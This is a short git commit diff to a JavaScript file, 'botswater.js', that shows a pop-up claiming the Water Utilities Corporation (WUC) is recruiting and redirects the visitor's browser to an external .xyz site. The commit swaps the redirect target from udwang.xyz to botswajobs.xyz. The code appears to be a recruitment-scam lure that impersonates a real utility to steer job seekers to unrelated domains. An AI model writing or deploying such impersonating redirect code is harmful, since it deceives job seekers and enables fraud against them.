ca925fecba4cbba8c1c7484878f361639d280937
newetijazz2 <newetijazz2@gmail.com>
2025-08-04 11:54:18 +0100

    Update botswater.js

--- botswater.js
+++ botswater.js
@@ -2,5 +2,5 @@
 var password = 'WUC Recruitment'
 password=prompt('NOTICE: Water Utilities Corporation (WUC) is currently recruiting, press OK to apply for the','WUC Recruitment');
 if (password != 'WUC Recruitment') {
-location.href='https://www.udwang.xyz/WUC-Recruitment';
+location.href='https://www.botswajobs.xyz/WUC-Recruitment';
 }
